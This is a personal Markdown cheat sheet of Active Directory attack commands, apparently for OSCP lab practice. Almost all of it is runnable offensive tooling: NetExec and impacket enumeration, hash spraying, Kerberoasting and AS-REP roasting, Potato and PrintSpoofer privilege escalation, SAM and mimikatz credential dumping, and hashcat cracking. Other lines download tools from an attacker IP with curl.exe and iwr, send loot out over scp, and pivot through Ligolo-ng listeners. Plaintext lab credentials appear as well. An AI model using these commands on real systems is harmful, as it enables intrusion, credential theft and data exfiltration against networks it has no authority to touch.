---
title: 
tags: []
phase: 
tool: []
---
# AD-To-Do-Checklist Quick Ref
## Find All Users
```bash
# OSCP-A live example
nxc smb <dc_ip> -u '<user>' -p '<password>' --users  # --users-export ./users_out.txt
nxc smb 10.10.158.140 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users-export ./oscp_users.txt

# impacket
python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1
```

### BloodHound
```bash
curl.exe http://192.168.45.190/SharpHound.ps1 -o sharphound.ps1
iwr -uri http://192.168.45.190/SharpHound.ps1 -Outfile SharpHound.ps1

# sharphound.exe -c all -d <domain>
powershell -ep bypass
. .\SharpHound.ps1  ; Invoke-BloodHound -CollectionMethod All # must be run as domain user, not Local Admin
scp *.zip kali@192.168.45.190:~/Documents/Boxes/
sudo ./bloodhound-cli up   
```
## Hash Spray
```bash
# bruteforce all hashes against all users
nxc smb 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
nxc winrm 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
nxc ldap 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
nxc wmi 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success

```
## Find Kerberoastable Users
```bash
# Hash TGS
# OSCP-A live example
impacket-GetUserSPNs -dc-host dc01.oscp.exam -dc-ip 10.10.158.140  oscp.exam/Eric.Wallows:'EricLikesRunning800' -request > kerberroast.hash

Rubeus.exe kerberoast
```
## Find ASREProastable Users
```bash
# OSCP-A live example
impacket-GetNPUsers -dc-host dc01.oscp.exam -dc-ip 10.10.158.140 -usersfile ./loot/oscp_users.txt -request -format hashcat -outputfile asreproast.hash oscp.exam/

Rubeus.exe asreproast /user:svc_account /domain:corp.local /outfile:asrep.hashes

# Crack with hashcat (example hashcat mode 18200 for AS-REP):
hashcat -m 18200 asrep.hashes /path/to/wordlist.txt
```

## Enumerate SMB
```bash
nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus
nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\<filename> <filename>]
```

## Get Local System 

```bash
# Requires SEImpersonate, and possibly SeCreateGlobalPrivilege  
# https://github.com/itm4n/PrintSpoofer
.\printspoof.exe -i -c cmd
RoguePotato 
God Potato

# SMBGhost CVE-2020-0796
#CVE-2021-36934 (HiveNightmare/SeriousSAM)
# Allows you to read SAM data (sensitive) in Windows 10, as well as the SYSTEM and SECURITY hives.
findstr /si 'pass' *.txt *.xml *.docx *.ini
winPEASany_ofs.exe
.\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended

# windows.old, dump sam system 
*Evil-WinRM* PS C:\windows.old\windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\windows\system32> download SYSTESM

secretsdump.py -sam SAM -system SYSTEM LOCAL
```
## Export creds
- `Local System` required
```powershell
log c:\wamp\mk\sam.log  # start logging
.\mimikatz.exe
privilege::debug 
token::elevate   # elevate to SYSTEM user privileges.
lsadump::sam 
sekurlsa::logonpasswords  attempts to extract plaintext passwords and password hashes from all available sources.
log # stop loggin
scp *.log kali@192.168.45.190:~/Documents/Boxes/

# Cracking NTLM with john and hashcat
john --wordlist=$rockyou --rules=best64 ntlm.hash --format=NT  
hashcat -m 1000 ntlm.hash $rockyou -r /usr/share/hashcat/rules/best64.rule --force

john ntlm.hash --show --format=NT
```
## PIVOT
- [Ligolo-ng](/99-Tools/ligolo-ng)
``` bash
proxy -selfcert		# KALI start ligolo-ng
curl.exe http://192.168.45.210/ligolo_agent.exe -o agent.exe  # WINDOWS
./agent.exe -connect 192.168.45.210:11601 -ignore-cert   # WINDOWS

### KALI ################
session 
autoroute
select subnet/route you want access to
create a new interface, start tunnel

## Reverse shell KALI - > BOX 1 <- Box 2
# On kali -> ligolo-ng -> box 1 sessions
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:4445 --tcp
# Box 2 : syntax to use
curl.exe http://10.10.158.141:30000/SharpHound.ps1 -o SharpHound.ps1
```



